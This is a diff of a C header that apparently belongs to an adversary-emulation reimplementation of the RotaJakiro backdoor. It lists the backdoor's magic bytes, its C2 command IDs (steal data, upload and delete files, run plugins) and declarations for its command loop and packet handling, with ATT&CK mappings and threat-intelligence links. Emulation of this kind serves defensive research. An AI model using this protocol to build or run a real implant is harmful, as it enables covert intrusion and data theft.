@@ -12,84 +12,165 @@
 #ifndef C2_COMMANDS_H_
 #define C2_COMMANDS_H_
 
-/**
-* @brief exit and kill rota via command-id 0x138E3E6
-* @params: N/A
-*
-*/
-void c2_exit(void);
+#include <stdbool.h>
 
-/**
-* @brief check if connection is alive via command-id 0x208307A
-* TODO: double-verify what check does in binary
-*
-**/
-void c2_test();
+//RotaJakiro Magic Headers
+const static unsigned char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
+const static unsigned char initialBytes[] = {0x21, 0x70, 0x27, 0x20};
+static unsigned char sessionId[4] = {0x01, 0x02, 0x03, 0x04};
+static unsigned char payloadLen[] = {0x0f};
+static unsigned char keyLen[] = {0x00,0x00};
+static unsigned char cmd_id[] = {0x00, 0x00, 0x00, 0x00};
+const static unsigned char marker_1[] = {0xc2, 0x00};
+const static unsigned char marker_2[] = {0xe2, 0x00};
+const static unsigned char marker_3[] = {0xc2, 0x00};
+const static unsigned char marker_4[] = {0xff,0x00};
 
-/**
-* @brief ??? command-id: 0x5CCA727
-**/
-void c2_heartbeat();
+// RotaJakiro Command IDs
+// Taken from https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+const static unsigned char rota_c2_exit[4] = {0x13, 0x8e, 0x3e, 0x06};
+const static unsigned char rota_c2_heartbeat[4] = {0x5c, 0xca, 0x72, 0x07};
+const static unsigned char rota_c2_set_timeout[4] = {0x17,0xB1, 0xCC, 0x04};
+const static unsigned char rota_c2_steal_data[4] = {0x25, 0x36, 0x60, 0xEA};
+const static unsigned char rota_c2_upload_dev_info[4] = {0x18, 0x32, 0x0e, 0x00};
+const static unsigned char rota_c2_upload_file[4] = {0x2E, 0x25, 0x99, 0x02};
+const static unsigned char rota_c2_query_file[4] = {0x2C, 0xD9, 0x07, 0x00};
+const static unsigned char rota_c2_delete_file[4] = {0x12, 0xB3, 0x62, 0x09};
+const static unsigned char rota_c2_run_plugin_1[4] = {0x1B, 0x25, 0x50, 0x30};
 
-/**
-* @brief update the c2 call back time command-id 0x17B1CC4
-* @param integer indicating how long to sleep for.
-*
-* @return N/A
-**/
-void c2_set_timeout(int sleeptime);
 
-/**
-* @brief obtain sensitive info (TODO - what sensitive info) from host machine command-id: 0x25360EA
-* @return: a char * to encrypted and compressed data stolen
-*/
-char *c2_steal_sensitive_info();
+// c2_loop
+//    About:
+//      Main c2 loop to process commands from handler
+//    Result: Rota is sending heartbeats and recieving commands
+//    MITRE ATT&CK Techniques: N/A
+//    CTI: N/A
+//    Other References: N/A
+void c2_loop();
 
-/**
-* @brief obtain information from /etc/os-release command-id: 0x18320e0
-*
-*/
-void c2_upload_device_info();
+// c2_exit
+//    About:
+//      exit and kill rota
+//    Result: Rota stops execution.
+//    MITRE ATT&CK Techniques: N/A
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+//    Other References: N/A
+void c2_exit(char *cmd_id, int sock2);
 
-/**
-* @brief check for the existance of a given file/plugin on the file system 0x2CD9070
-* @param fpath file to check exists.
-* @return true a file exists, false it does not.
-*
-*/
+
+// c2_set_timeout
+//    About:
+//      Send heartbeat packet back to C2 Server
+//    Result: update sleep time
+//    MITRE ATT&CK Techniques: N/A
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+//    Other References: N/A
+void c2_heartbeat(char *cmd_id, int sock);
+
+
+// c2_set_timeout
+//    About:
+//      Set implant to sleep for N-seconds
+//    Result: update sleep time
+//    MITRE ATT&CK Techniques: N/A
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+//    Other References: N/A
+void c2_set_timeout(int *sleeptime, int newTime);
+
+
+// c2_upload_device_info
+//    About:
+//      Obtain information about host machine
+//    Result: update char buffer with device information
+//    MITRE ATT&CK Techniques:
+//        T1082 System Information Discovery
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+//    Other References: N/A
+void c2_upload_device_info(char *buffer);
+
+// c2_query_file
+//    About:
+//      Query whether or not a file exixts
+//    Result: boolean value indicating whether or not a file exists.
+//    MITRE ATT&CK Techniques:
+//        T1083.004 File and Directory Discovery
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+//    Other References: N/A
 bool c2_query_file(char *fpath);
 
 
-/**
-* @brief delete a file/plugin given a specific file path. 0x12B3629
-* @param char* of filepath to delete.
-* @return boolean indicating success/failure of deleting a file
-**/
+// c2_delete_file
+//    About:
+//      Delete a file
+//    Result: boolean value indicating whether or not a file was deleted.
+//    MITRE ATT&CK Techniques:
+//        T1070.004 Indicator removal: File deletion
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+//    Other References: N/A
 bool c2_delete_file(char *fpath);
 
-/**
- * @brief Load and run a SO as a "plugin" command-id 0x1B25503
- * @note no public threat intelligence exists about the contents of the plugins executed.
- *
- * @return N/A
- **/
-void c2_run_plugin_1();
+// c2_run_plugin_1
+//    About:
+//       Execute Shared Object
+//    Result: Loading and execution of Shared Objection
+//    MITRE ATT&CK Techniques: N/A
+//         TODO - in new version of ATT&CK?
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+//    Other References:
+//        https://man7.org/linux/man-pages/man3/dlopen.3.html
+void c2_run_plugin_1(char *funcName);
 
-/**
- * @brief Load and run a SO as a "plugin" command-id 0x1532E65
- * @note no public threat intelligence exists about the contents of the plugins executed.
- *
- * @return N/A
- **/
-void c2_run_plugin_2();
+// initial_rota_pkt
+//    About:
+//       Create initial 82 byte header for Rota
+//    Result: char * of rota header
+//    MITRE ATT&CK Techniques: N/A
+//    CTI: N/A
+//    Other References: N/A
+char *initial_rota_pkt();
+
+// parse_c2_cmdid
+//    About:
+//       Parse C2 command id
+//    Result: char * of  command id
+//    MITRE ATT&CK Techniques: N/A
+//    CTI: N/A
+//    Other References: N/A
+char *parse_c2_cmdid(char *buffer);
+
+// parse_c2_payload_len
+//    About:
+//       Parse C2 payload len
+//    Result: integer value of payload length
+//    MITRE ATT&CK Techniques: N/A
+//    CTI: N/A
+//    Other References: N/A
+int parse_c2_payload_len(char *buffer);
+
+// parse_c2_payload
+//    About:
+//       Parse C2 payload for command id extraction
+//    Result: char buffer for payload
+//    MITRE ATT&CK Techniques: N/A
+//    CTI: N/A
+//    Other References: N/A
+char *parse_c2_payload(char *buffer, int length);
 
 
-/**
- * @brief Load and run a SO as a "plugin" command-id 0x25D5082
- * @note no public threat intelligence exists about the contents of the plugins executed.
- *
- * @return N/A
- **/
-void c2_run_plugin_3();
+// build_c2_response2
+//    About:
+//       Explicitly specify the size of data to send back to c2 server
+//    Result: void, data is sent to server
+//    MITRE ATT&CK Techniques: N/A
+//    CTI: N/A
+//    Other References: N/A
+void build_c2_response2(char *buffer, int buffer_size, char *cmd_id, int sock);
 
 #endif // C2_COMMANDS_H_
